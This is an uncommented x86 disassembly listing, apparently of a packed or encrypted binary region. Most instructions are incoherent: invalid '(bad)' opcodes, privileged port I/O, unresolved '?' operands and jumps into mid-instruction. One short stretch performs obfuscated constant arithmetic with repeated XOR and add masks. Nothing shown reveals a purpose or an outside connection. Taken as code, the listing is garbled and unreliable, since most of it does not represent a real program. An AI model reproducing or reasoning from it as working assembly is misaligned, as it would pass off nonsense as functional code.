  4102a0:	arpl   WORD PTR [eax+eax*2],bp
  4102a3:	sub    BYTE PTR [edi+0x57e34c62],al
  4102a9:	pop    edx
  4102aa:	mov    ebp,0x7aa830d5
  4102af:	cwde   
  4102b0:	fcmovnb st,st(4)
  4102b2:	or     al,0xa0
  4102b4:	add    eax,0xc7df4101
  4102b9:	in     eax,0x90
  4102bb:	mov    bh,0xce
  4102bd:	test   DWORD PTR [ebx+0x6],eax
  4102c0:	nop
  4102c1:	lea    edi,[ebp+0x3e4fdcf2]
  4102c7:	xchg   esi,eax
  4102c8:	xchg   DWORD PTR [eax-0x6a062521],ebx
  4102ce:	cli    
  4102cf:	cmp    ecx,esi
  4102d1:	fstp   QWORD PTR [edi-0x19]
  4102d4:	pop    esi
  4102d5:	dec    edx
  4102d6:	outs   dx,DWORD PTR ds:[esi]
  4102d7:	xor    esi,esp
  4102d9:	mov    eax,ds:0xef9a755d
  4102de:	sub    DWORD PTR [ecx],ecx
  4102e0:	jecxz  0x4102e1
  4102e2:	popa   
  4102e3:	ins    BYTE PTR es:[edi],dx
  4102e4:	outs   dx,BYTE PTR ds:[esi]
  4102e5:	aas    
  4102e6:	frstor [ecx+0x4283392c]
  4102ec:	les    edx,FWORD PTR [eax]
  4102ee:	jmp    0x410280
  4102f0:	or     ch,BYTE PTR [edi]
  4102f2:	mov    BYTE PTR [esi+0x57835715],al
  4102f8:	and    ch,BYTE PTR [ecx]
  4102fa:	adc    ebx,ebx
  4102fc:	inc    esi
  4102fd:	mov    bh,0x15
  4102ff:	sub    esi,DWORD PTR [ecx+0x7a]
  410302:	gs mov bh,0x25
  410305:	mov    esi,?
  410307:	cmp    BYTE PTR [edx],al
  410309:	jmp    0x410300
  41030b:	add    DWORD PTR [eax-0x5e06c23d],0xffffffb5
  410312:	mov    bh,0xdb
  410314:	add    DWORD PTR ds:0x783e8275,0xfffffff4
  41031b:	jbe    0x41035c
  41031d:	jbe    0x4102fc
  41031f:	cmp    DWORD PTR [ebp+0x35],edx
  410322:	cmp    BYTE PTR [ebp+0x6f67915e],0x66
  410329:	cs pop ecx
  41032b:	adc    al,0x24
  41032d:	jp     0x410331
  41032f:	das    
  410330:	ret    
  410331:	imul   ebx,DWORD PTR [ebp-0x85d8af7],0xbc0257f2
  41033b:	inc    ebp
  41033c:	nop
  41033d:	(bad)  
  41033e:	mov    ebx,0x797290c0
  410343:	out    0x48,al
  410345:	jb     0x4103b4
  410347:	mov    ecx,0xa3fe4ab7
  41034c:	(bad)  
  41034d:	out    dx,eax
  41034e:	or     bl,ch
  410350:	dec    esp
  410351:	out    0xea,eax
  410353:	test   edi,edi
  410355:	dec    ebx
  410356:	add    DWORD PTR [edi+0x7d],ecx
  410359:	jo     0x41039c
  41035b:	pushf  
  41035c:	sbb    dl,bl
  41035e:	mov    es,WORD PTR [ecx-0x61cb34c3]
  410364:	sbb    al,0xc2
  410366:	xchg   ecx,eax
  410367:	lods   al,BYTE PTR ds:[esi]
  410368:	retf   0xf49a
  41036b:	cmp    ebp,ebx
  41036d:	mov    DWORD PTR [esi-0x5],edi
  410370:	mov    cs,ebx
  410372:	ins    BYTE PTR es:[edi],dx
  410373:	popa   
  410374:	shl    BYTE PTR ds:0x7eab4243,cl
  41037a:	stos   BYTE PTR es:[edi],al
  41037b:	fmul   QWORD PTR [edi+0x224ead61]
  410381:	jne    0x4103ee
  410383:	rcr    DWORD PTR [edi],0x68
  410386:	ss mov cl,BYTE PTR ss:[esi+0x450ccd45]
  41038e:	sbb    bl,BYTE PTR [ecx-0xc]
  410391:	icebp  
  410392:	imul   eax,DWORD PTR [ebx],0x92082f72
  410398:	mov    ds,WORD PTR [ebp-0x7d7dea45]
  41039e:	pop    edi
  41039f:	mov    al,0xb4
  4103a1:	ds push 0xdfd759fa
  4103a7:	shr    BYTE PTR [ebx-0x2b],0x84
  4103ab:	mov    cl,ch
  4103ad:	(bad)
  4103b0:	into   
  4103b1:	and    al,0xbe
  4103b3:	sbb    dl,BYTE PTR [ecx-0x15]
  4103b6:	rcl    bh,1
  4103b8:	pusha  
  4103b9:	xrelease xchg DWORD PTR ds:0x27989786,ebp
  4103c0:	mov    eax,ds:0x880b7137
  4103c5:	addr16 and dl,bl
  4103c8:	cdq    
  4103c9:	ins    DWORD PTR es:[edi],dx
  4103ca:	daa    
  4103cb:	cmp    eax,0xb547b46
  4103d0:	cdq    
  4103d1:	pop    ss
  4103d2:	dec    edi
  4103d3:	push   cs
  4103d4:	pop    ss
  4103d5:	addr16 mov bl,0x68
  4103d8:	xchg   ecx,eax
  4103d9:	dec    ebx
  4103da:	push   ecx
  4103db:	pop    ecx
  4103dc:	pop    es
  4103dd:	inc    ebp
  4103de:	and    ch,BYTE PTR [ecx]
  4103e0:	in     al,dx
  4103e1:	out    dx,eax
  4103e2:	lock scas eax,DWORD PTR es:[edi]
  4103e4:	adc    cl,dh
  4103e6:	test   DWORD PTR [ebx-0x322b323a],ecx
  4103ec:	cwde   
  4103ed:	pop    edx
  4103ee:	adc    ebp,DWORD PTR [ebx-0x67]
  4103f1:	mov    ds:0xb17a9304,eax
  4103f6:	pop    ds
  4103f7:	test   eax,0x1fc07eeb
  4103fc:	and    DWORD PTR ds:0xd6967b40,esp
  410402:	or     bl,BYTE PTR [ecx+0x237596df]
  410408:	xor    BYTE PTR [edx],bh
  41040a:	sbb    al,0xe6
  41040c:	(bad)  
  41040d:	mov    al,0x93
  41040f:	push   ds
  410410:	lock hlt 
  410412:	cwde   
  410413:	cli    
  410414:	adc    BYTE PTR [edi],al
  410416:	xchg   ebp,eax
  410417:	fadd   QWORD PTR [edx+0x4]
  41041a:	pushf  
  41041b:	mov    ecx,0x9e65fcb8
  410420:	inc    eax
  410421:	adc    esi,esp
  410423:	mov    dl,0xb1
  410425:	or     eax,0xc6a51dbc
  41042a:	jmp    0x410414
  41042c:	fild   DWORD PTR [edi+0x2aba0cb4]
  410432:	dec    esi
  410433:	sub    ah,ch
  410435:	xchg   ecx,eax
  410436:	je     0x410465
  410438:	jnp    0x41049d
  41043a:	inc    esi
  41043b:	int    0xc7
  41043d:	aam    0xfe
  41043f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410440:	sahf   
  410441:	or     DWORD PTR [esi],ebx
  410443:	ins    BYTE PTR es:[edi],dx
  410444:	sub    al,0x57
  410446:	outs   dx,BYTE PTR ds:[esi]
  410447:	js     0x41040b
  410449:	fist   WORD PTR [edi-0x61]
  41044c:	inc    eax
  41044d:	test   BYTE PTR [edx-0x7],0x98
  410451:	retf   
  410452:	out    dx,eax
  410453:	xchg   edi,eax
  410454:	mov    ebp,0x81666750
  410459:	scas   al,BYTE PTR es:[edi]
  41045a:	ins    BYTE PTR es:[edi],dx
  41045b:	arpl   WORD PTR [ebp+0xc],sp
  41045e:	cdq    
  41045f:	ins    BYTE PTR es:[edi],dx
  410460:	aad    0x70
  410462:	hlt    
  410463:	xchg   ebx,eax
  410464:	ficom  DWORD PTR [esi]
  410466:	pop    ebp
  410467:	ins    BYTE PTR es:[edi],dx
  410468:	and    dl,BYTE PTR [edi+0x316639fc]
  41046e:	jecxz  0x410421
  410470:	enter  0x4ed3,0xf0
  410474:	in     al,dx
  410475:	clc    
  410476:	sbb    al,0xba
  410478:	mov    ds:0xc9ff9d46,al
  41047d:	jge    0x41046f
  41047f:	imul   esp,DWORD PTR [edi+0x2c],0x2553d6a3
  410486:	aas    
  410487:	cmp    al,0x29
  410489:	dec    edi
  41048a:	(bad)  
  41048b:	sub    al,0x2
  41048d:	mov    bh,0xa0
  41048f:	inc    ebx
  410490:	pop    ss
  410491:	xor    al,BYTE PTR [edi]
  410493:	mov    cr4,edx
  410496:	push   0xffffff82
  410498:	scas   al,BYTE PTR es:[edi]
  410499:	les    ecx,FWORD PTR [ecx]
  41049b:	in     al,0x2d
  41049d:	ins    BYTE PTR es:[edi],dx
  41049e:	mov    esp,0x337440b9
  4104a3:	pop    edi
  4104a4:	lea    esp,[ecx+ecx*8]
  4104a7:	jae    0x41043a
  4104a9:	out    dx,al
  4104aa:	sub    al,0xb9
  4104ac:	cmp    al,0xad
  4104ae:	div    BYTE PTR [eax]
  4104b0:	clc    
  4104b1:	adc    ah,cl
  4104b3:	push   esp
  4104b4:	ins    DWORD PTR es:[edi],dx
  4104b5:	sub    BYTE PTR [ebx-0x38],cl
  4104b8:	xor    al,0x5f
  4104ba:	ins    BYTE PTR es:[edi],dx
  4104bb:	mov    WORD PTR [ebx+0x1db91ce1],cs
  4104c1:	or     bh,BYTE PTR [edx+0x2ca10f50]
  4104c7:	add    BYTE PTR [ecx],bl
  4104c9:	test   BYTE PTR ds:0x9b3b4dbe,dl
  4104cf:	pushf  
  4104d0:	xchg   esp,eax
  4104d1:	outs   dx,DWORD PTR ds:[esi]
  4104d2:	fstp   QWORD PTR [eax-0x36]
  4104d5:	retf   
  4104d6:	or     al,0x1f
  4104d8:	in     al,0x95
  4104da:	push   cs
  4104db:	aas    
  4104dc:	retf   
  4104dd:	shl    bh,1
  4104df:	arpl   si,si
  4104e1:	loopne 0x4104d4
  4104e3:	into   
  4104e4:	sub    esi,ebx
  4104e6:	and    edx,DWORD PTR [esi+0x39f02648]
  4104ec:	push   es
  4104ed:	mov    esi,0x533960cd
  4104f2:	lods   eax,DWORD PTR ds:[esi]
  4104f3:	add    ebp,DWORD PTR [ebx]
  4104f5:	gs sub bl,dh
  4104f8:	les    eax,FWORD PTR [ebx+ecx*1-0x48]
  4104fc:	jbe    0x410574
  4104fe:	xchg   ecx,eax
  4104ff:	sbb    BYTE PTR [esi+0x3c4c5aee],ch
  410505:	(bad)  
  410507:	pop    edx
  410508:	jns    0x410559
  41050a:	fdivr  DWORD PTR [edi-0x2dfdff6c]
  410510:	fwait
  410511:	idiv   DWORD PTR [edx]
  410513:	and    eax,DWORD PTR [esi+0x29]
  410516:	out    0x86,eax
  410518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410519:	pop    esi
  41051a:	jnp    0x4104f5
  41051c:	or     eax,0x1fbc50c
  410521:	scas   al,BYTE PTR es:[edi]
  410522:	std    
  410523:	sub    eax,0xff0f223a
  410528:	sbb    edx,DWORD PTR [esi+0x15]
  41052b:	ins    BYTE PTR es:[edi],dx
  41052c:	push   ss
  41052d:	in     al,0xf9
  41052f:	fs xchg ecx,eax
  410531:	jne    0x410524
  410533:	xchg   ebp,eax
  410534:	add    BYTE PTR [ebp+eax*2-0x20f5e9c0],al
  41053b:	add    ebx,edx
  41053d:	lods   eax,DWORD PTR ds:[esi]
  41053e:	mov    ds:0xe1fcbad0,eax
  410543:	cmc    
  410544:	pop    ebp
  410546:	int3   
  410547:	clc    
  410548:	repz mov ebp,cs
  41054b:	fild   DWORD PTR [esi+0x34dba652]
  410551:	shl    cl,0xc5
  410554:	aam    0x47
  410556:	test   eax,0xcc413fa8
  41055b:	(bad)  
  41055c:	xchg   BYTE PTR [edi+0x3b],al
  41055f:	jl     0x4105a1
  410561:	push   ecx
  410562:	dec    eax
  410563:	test   DWORD PTR [esi],ecx
  410565:	adc    al,0x1f
  410567:	add    al,0x8a
  410569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41056a:	push   esp
  41056b:	mov    ebp,0x840fc085
  410570:	mov    ss,WORD PTR [eax+eax*1]
  410573:	add    BYTE PTR [ecx-0x1016238b],cl
  410579:	add    eax,DWORD PTR [eax]
  41057b:	add    ch,ah
  41057d:	out    0x6f,al
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	adc    DWORD PTR [edx-0x40f583b7],edi
  41058e:	jo     0x410600
  410590:	dec    ecx
  410591:	jge    0x410603
  410593:	jo     0x41059b
  410595:	xchg   esp,eax
  410596:	mov    edi,esp
  410598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410599:	ins    BYTE PTR es:[edi],dx
  41059a:	retf   0x41f7
  41059d:	out    dx,eax
  41059e:	popa   
  41059f:	out    dx,al
  4105a0:	and    al,0x4e
  4105a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a3:	pop    eax
  4105a4:	dec    ebx
  4105a5:	sbb    al,0xf3
  4105a7:	retf   0x687e
  4105aa:	jne    0x4105fb
  4105ac:	sub    edi,DWORD PTR [ecx+0xe]
  4105af:	cdq    
  4105b0:	scas   eax,DWORD PTR es:[edi]
  4105b1:	xchg   BYTE PTR [ebp-0x7a],bl
  4105b4:	xor    bh,dh
  4105b6:	add    dh,dl
  4105b8:	dec    esi
  4105b9:	sbb    al,0x54
  4105bb:	cmp    eax,0xbcf73633
  4105c0:	js     0x4105a6
  4105c2:	jns    0x4105ae
  4105c4:	lock and DWORD PTR [ebp+0x74d080b7],ebp
  4105cb:	addr16 retf 
  4105cd:	sub    bh,ch
  4105cf:	or     eax,0xee087cb7
  4105d4:	jb     0x41064d
  4105d6:	mov    bl,0x44
  4105d8:	lahf   
  4105d9:	cli    
  4105da:	sub    al,0x52
  4105dc:	sub    edi,DWORD PTR [eax+0x791c8f2]
  4105e2:	jne    0x4105f8
  4105e4:	pop    edi
  4105e5:	sub    eax,0x9f0057d9
  4105ea:	mov    bh,0xf1
  4105ec:	pop    esi
  4105ed:	aaa    
  4105ee:	gs dec edx
  4105f0:	sub    BYTE PTR [edx],ah
  4105f2:	cwde   
  4105f3:	loope  0x41059b
  4105f5:	out    0xb1,al
  4105f7:	sbb    al,0x1c
  4105f9:	sub    al,0x8
  4105fb:	mov    ds:0x6632ec0c,al
  410600:	(bad)  
  410601:	aam    0xad
  410603:	push   eax
  410604:	push   0xffffff85
  410606:	inc    esi
  410607:	rcr    eax,0xfb
  41060a:	push   ebp
  41060b:	xor    BYTE PTR [ebx+0x21],bh
  41060e:	push   ecx
  41060f:	nop
  410610:	out    dx,al
  410611:	pop    ebp
  410612:	imul   ebp,eax,0x77
  410615:	out    dx,eax
  410616:	mov    bh,0xdd
  410618:	rcr    DWORD PTR [esi],cl
  41061a:	cmp    eax,0xeab391e4
  41061f:	xchg   ecx,eax
  410620:	or     BYTE PTR [ecx-0x26982450],al
  410626:	mov    al,0x52
  410628:	retf   
  410629:	(bad)  
  41062a:	dec    esp
  41062b:	and    BYTE PTR [esi-0x400bba6f],bh
  410631:	outs   dx,BYTE PTR ds:[esi]
  410632:	and    cl,bl
  410634:	iret   
  410635:	je     0x4105e6
  410637:	neg    BYTE PTR [eax-0xe3d660e]
  41063d:	push   esp
  41063e:	dec    eax
  41063f:	and    ah,BYTE PTR [ebp+0x31de76ac]
  410645:	ret    0xc61f
  410648:	xor    dh,BYTE PTR [esp+eax*2-0xcbed0bd]
  41064f:	arpl   WORD PTR [edi],di
  410651:	rol    BYTE PTR [ecx],cl
  410653:	shr    DWORD PTR [esi+0x6d53b6ef],0xbb
  41065a:	add    DWORD PTR [ecx],ebx
  41065c:	(bad)  
  41065d:	jbe    0x4105fb
  41065f:	fmul   QWORD PTR [edi+0x6e]
  410662:	test   edi,edx
  410664:	outs   dx,BYTE PTR ds:[esi]
  410665:	pushf  
  410666:	repnz fwait
  410668:	int    0x3f
  41066a:	mov    eax,DWORD PTR [edi]
  41066c:	mov    esi,0xc17f2184
  410671:	out    dx,al
  410672:	jno    0x4106b7
  410674:	je     0x4106b6
  410676:	xor    ch,BYTE PTR [edx-0x233de79b]
  41067c:	adc    DWORD PTR [ecx],ebx
  41067e:	call   FWORD PTR [edi+0x40]
  410681:	div    BYTE PTR [esi+0x1]
  410684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410685:	xor    DWORD PTR [ebx+0x35],edi
  410688:	sbb    ebx,ecx
  41068a:	dec    ebp
  41068b:	ins    DWORD PTR es:[edi],dx
  41068c:	cmp    edi,DWORD PTR [edx-0x58ccd620]
  410692:	fdivr  DWORD PTR [ebx+0x2a674669]
  410698:	in     al,0x75
  41069a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41069b:	leave  
  41069c:	cmp    dh,BYTE PTR [edi+0x28]
  41069f:	pop    esi
  4106a0:	adc    bl,BYTE PTR [eax+eiz*1-0x4d]
  4106a4:	std    
  4106a5:	test   BYTE PTR [ebx],dl
  4106a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106a8:	sub    eax,0xf3e9d555
  4106ad:	sbb    ecx,eax
  4106af:	mov    ?,WORD PTR [esi+eax*2-0x3f]
  4106b3:	add    ebx,ebx
  4106b5:	mov    ah,0xc4
  4106b7:	in     eax,0x89
  4106b9:	xchg   ecx,eax
  4106ba:	inc    esp
  4106bb:	fidivr WORD PTR [edi-0x1c]
  4106be:	or     BYTE PTR [edx+0x1d],dl
  4106c1:	je     0x410682
  4106c3:	mov    dh,0x4a
  4106c5:	jb     0x4106eb
  4106c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106c8:	or     al,0x49
  4106ca:	jmp    0x41069c
  4106cc:	mov    cl,0x47
  4106ce:	push   es
  4106cf:	cli    
  4106d0:	mov    eax,ds:0xa799de4c
  4106d5:	and    al,0x39
  4106d7:	fdiv   st(5),st
  4106d9:	cmp    bh,BYTE PTR [ecx]
  4106db:	sub    dl,bh
  4106dd:	add    eax,0xd7569deb
  4106e2:	xchg   BYTE PTR [edi+edi*1+0x6],ch
  4106e6:	ja     0x4106da
  4106e8:	push   eax
  4106e9:	cmc    
  4106ea:	sub    eax,0xf5a66c24
  4106ef:	mov    ds:0x4ca562ee,al
  4106f4:	xchg   ebx,eax
  4106f5:	js     0x410714
  4106f7:	lods   eax,DWORD PTR ds:[esi]
  4106f8:	in     al,dx
  4106f9:	scas   eax,DWORD PTR es:[edi]
  4106fa:	sbb    eax,0x95e511f7
  4106ff:	(bad)  
  410700:	(bad)  
  410701:	dec    ebp
  410702:	mov    al,ds:0x689fa68d
  410707:	fiadd  DWORD PTR [ecx-0xb8b18e4]
  41070d:	add    bh,BYTE PTR [edx]
  41070f:	adc    bl,dl
  410711:	or     eax,0x2421163c
  410716:	test   DWORD PTR [esi],esi
  410718:	bnd ret 0x3c2e
  41071c:	adc    esi,DWORD PTR [ebx+0x5c710f28]
  410722:	ins    BYTE PTR es:[edi],dx
  410723:	outs   dx,BYTE PTR ds:[esi]
  410724:	popf   
  410725:	adc    DWORD PTR [ecx+eiz*4],ebp
  410728:	pop    edi
  410729:	push   esi
  41072a:	xor    eax,0xa166f25b
  41072f:	stc    
  410730:	popf   
  410731:	inc    ecx
  410732:	and    eax,DWORD PTR [edx-0x64]
  410735:	aad    0xb0
  410737:	xchg   ebp,eax
  410738:	push   edx
  410739:	inc    ebx
  41073a:	sub    BYTE PTR [ebp-0x3c865302],dh
  410740:	call   0xa05ac725
  410745:	das    
  410746:	push   ebp
  410747:	test   BYTE PTR [edi+0x43655fbf],dh
  41074d:	xor    ch,BYTE PTR [edi+eax*8+0x23868a12]
  410754:	and    eax,0x1d6ec101
  410759:	icebp  
  41075a:	fsubp  st(2),st
  41075c:	loop   0x41071e
  41075e:	test   eax,0xe7b7e2ad
  410763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410764:	and    BYTE PTR [ecx-0x1b027d06],0x6e
  41076b:	fwait
  41076c:	aas    
  41076d:	into   
  41076e:	je     0x41071c
  410770:	loopne 0x41076a
  410772:	call   0xe699:0xe76a22a1
  410779:	jne    0x410745
  41077b:	aad    0x7a
  41077d:	sub    BYTE PTR fs:[ecx-0x4bee0dac],cl
  410784:	loop   0x410790
  410786:	cmp    al,0x95
  410788:	push   es
  410789:	pop    ebx
  41078a:	push   edi
  41078b:	dec    ebp
  41078c:	adc    cl,cl
  41078e:	retf   
  41078f:	loop   0x410767
  410791:	enter  0xfca9,0x3b
  410795:	test   BYTE PTR [ebx-0x74],ah
  410798:	imul   ebx,DWORD PTR [esp+ebx*8],0x36
  41079c:	cmp    al,0xe8
  41079e:	add    BYTE PTR [ebx-0x6964371d],dl
  4107a4:	call   0x9cf1:0xca6446fb
  4107ab:	ret    
  4107ac:	push   ebx
  4107ad:	jecxz  0x410799
  4107af:	jne    0x41073f
  4107b1:	xor    eax,0x9819fb46
  4107b6:	aad    0x21
  4107b8:	xchg   ecx,eax
  4107b9:	mov    al,ds:0xab816e32
  4107be:	dec    ebx
  4107bf:	gs push es
  4107c1:	ror    DWORD PTR [edi-0x3cc81bf1],cl
  4107c7:	jle    0x41080a
  4107c9:	in     eax,0x72
  4107cb:	imul   ebp,DWORD PTR [edx-0x21b7539],0x2214f9cc
  4107d5:	dec    eax
  4107d6:	add    esi,DWORD PTR [ebx-0x4]
  4107d9:	mov    dh,0x47
  4107db:	jge    0x4107d0
  4107dd:	xor    DWORD PTR [eax-0x2dfab6ba],esp
  4107e3:	clc    
  4107e4:	neg    BYTE PTR [eax-0x9afbfaf]
  4107ea:	cdq    
  4107eb:	call   FWORD PTR [edi+0x4d]
  4107ee:	(bad)  
  4107ef:	inc    edi
  4107f0:	retf   0x3bd2
  4107f3:	mov    esi,0x5b0ba963
  4107f8:	jl     0x410872
  4107fa:	push   ds
  4107fb:	jl     0x410861
  4107fd:	jo     0x4107b1
  4107ff:	push   esi
  410800:	mov    edx,0xa403ecc6
  410805:	jmp    0x410864
  410807:	add    al,0xeb
  410809:	cmp    DWORD PTR [eax+0x4b],esp
  41080c:	cmp    dh,ch
  41080e:	pop    esp
  41080f:	fcmovne st,st(1)
  410811:	jb     0x410858
  410813:	push   0x5c
  410815:	rcr    DWORD PTR [ebx],1
  410817:	popf   
  410818:	xor    edx,DWORD PTR [ebx-0x58]
  41081b:	imul   DWORD PTR [eax-0x38]
  41081e:	xor    eax,0x4f1aedfe
  410823:	jae    0x410832
  410825:	push   esp
  410826:	ret    
  410827:	pop    edi
  410828:	sbb    cl,BYTE PTR [ebp+ebx*1-0x5eb0b3f7]
  41082f:	lock cmp al,0x4c
  410832:	out    dx,eax
  410833:	mov    ds:0x1a6034fc,al
  410838:	cmp    DWORD PTR [edx-0x1e],eax
  41083b:	js     0x410818
  41083d:	pop    esi
  41083e:	mov    bh,0xd4
  410840:	sahf   
  410841:	sbb    esp,DWORD PTR [ebx+eax*8-0x32]
  410845:	mov    ebx,DWORD PTR [edi]
  410847:	aad    0x4c
  410849:	sahf   
  41084a:	pop    ebp
  41084b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41084c:	and    eax,0x7b8fd7ad
  410851:	jb     0x4107f9
  410853:	fld    DWORD PTR [ecx]
  410855:	fist   WORD PTR [eax+0x1a46883]
  41085b:	push   ds
  41085c:	retf   
  41085d:	daa    
  41085e:	retf   0x1b48
  410861:	mov    WORD PTR [esi],es
  410863:	push   esi
  410864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410865:	pushf  
  410866:	(bad)  
  410867:	out    0xb0,al
  410869:	sbb    esp,0x89e53f5f
  41086f:	sti    
  410870:	data16 jl 0x4108d2
  410873:	pop    edi
  410874:	sub    eax,0x7dcc7371
  410879:	push   edx
  41087a:	fnstcw WORD PTR [esi+0x5cf49c9b]
  410880:	cmp    DWORD PTR [ebx],ebx
  410882:	clc    
  410883:	mov    edi,0x5e54477b
  410888:	adc    al,0xc7
  41088a:	cdq    
  41088b:	add    DWORD PTR [ebp+0xe],edx
  41088e:	jno    0x410856
  410890:	stos   DWORD PTR es:[edi],eax
  410891:	pushf  
  410892:	out    dx,al
  410893:	xor    eax,0x433de3f1
  410898:	and    al,0x65
  41089a:	cmp    al,BYTE PTR [ecx-0x733a496c]
  4108a0:	adc    ch,BYTE PTR [edi-0x10086c7f]
  4108a6:	mov    cl,0xc2
  4108a8:	cmp    eax,ebx
  4108aa:	push   cs
  4108ab:	mov    cl,0x5c
  4108ad:	ret    0x481f
  4108b0:	sbb    BYTE PTR [ebp+eax*4-0x29d4f100],0xeb
  4108b8:	fwait
  4108b9:	mov    bh,al
  4108bb:	xchg   ebp,eax
  4108bc:	pop    ds
  4108bd:	mov    cl,0x1
  4108bf:	push   0x6d
  4108c1:	stos   BYTE PTR es:[edi],al
  4108c2:	fistp  DWORD PTR [ecx+esi*2-0x2c1b94e5]
  4108c9:	or     DWORD PTR [edx+0x2d2f24ec],edx
  4108cf:	cdq    
  4108d0:	aam    0xf0
  4108d2:	sub    al,0xdd
  4108d4:	inc    ebp
  4108d5:	pop    edi
  4108d6:	mov    ah,0x3d
  4108d8:	cmp    bh,BYTE PTR [edx+0x65]
  4108db:	test   eax,0x87294c36
  4108e0:	xor    DWORD PTR [ebp+0x5d],esi
  4108e3:	dec    eax
  4108e4:	adc    al,0x9f
  4108e6:	int3   
  4108e7:	ret    0x410e
  4108ea:	imul   eax,esp,0xffffffc6
  4108ed:	mov    eax,0x2a2b9302
  4108f2:	stos   DWORD PTR es:[edi],eax
  4108f3:	mul    DWORD PTR [ebx]
  4108f5:	cs add ebx,eax
  4108f8:	jg     0x4108a1
  4108fa:	sub    edx,0x4e
  4108fd:	sbb    ch,0xb5
  410900:	pusha  
  410901:	xchg   ebp,eax
  410902:	cmp    edx,edi
  410904:	jle    0x4108b6
  410906:	loope  0x410972
  410908:	inc    eax
  410909:	fucom  st(0)
  41090b:	(bad)  
  41090c:	icebp  
  41090d:	iret   
  41090e:	jl     0x4108e8
  410910:	jl     0x4108cb
  410912:	ss push ebx
  410914:	addr16 jge 0x4108e2
  410917:	stc    
  410918:	xor    al,0xcd
  41091a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091b:	mov    esi,0x3e2c9906
  410920:	or     esp,esp
  410922:	cmc    
  410923:	rcl    BYTE PTR [esi],0x4d
  410926:	xlat   BYTE PTR ds:[ebx]
  410927:	int3   
  410928:	and    DWORD PTR [edi+0x2a29af3a],ebx
  41092e:	test   DWORD PTR [ecx],0xd527f47d
  410934:	stos   BYTE PTR es:[edi],al
  410935:	retf   
  410936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410937:	into   
  410938:	loope  0x41091b
  41093a:	ss jnp 0x410911
  41093d:	aas    
  41093e:	sbb    DWORD PTR [ebp+0x45],esp
  410941:	add    ebp,0x6d
  410944:	push   esp
  410945:	rol    DWORD PTR [edi+ebx*8-0x2af228c0],1
  41094c:	sub    eax,0x64f7dc9c
  410951:	push   eax
  410952:	dec    ebp
  410953:	inc    ecx
  410954:	xchg   esi,eax
  410955:	jmp    0x347ffded
  41095a:	cmp    BYTE PTR [edx-0xba769a7],cl
  410960:	adc    ebp,edx
  410962:	cmp    ecx,DWORD PTR ss:[esi-0x47]
  410966:	mov    dl,0xf1
  410968:	mov    ecx,DWORD PTR [esi+0x590b6a4a]
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a05:	add    eax,0xbc639fe9
  410a0a:	jo     0x410a7c
  410a0c:	dec    ecx
  410a0d:	jge    0x410a7f
  410a0f:	jo     0x410992
  410a11:	jecxz  0x410a78
  410a13:	out    dx,eax
  410a14:	mov    eax,ds:0xe17ec1a4
  410a19:	pop    ds
  410a1a:	mov    ds:0xa07ac0ad,eax
  410a1f:	daa    
  410a20:	cmp    cl,BYTE PTR [ebx]
  410a22:	and    DWORD PTR [ebp-0x77],eax
  410a25:	jae    0x4109d8
  410a27:	mov    dl,0xf5
  410a29:	cmp    al,0xa3
  410a2b:	inc    ebx
  410a2c:	xchg   edx,eax
  410a2d:	jecxz  0x410a26
  410a2f:	jl     0x410a9b
  410a31:	push   eax
  410a32:	xor    ch,BYTE PTR [ecx+0x53]
  410a35:	(bad)  
  410a36:	pusha  
  410a37:	in     eax,0x3c
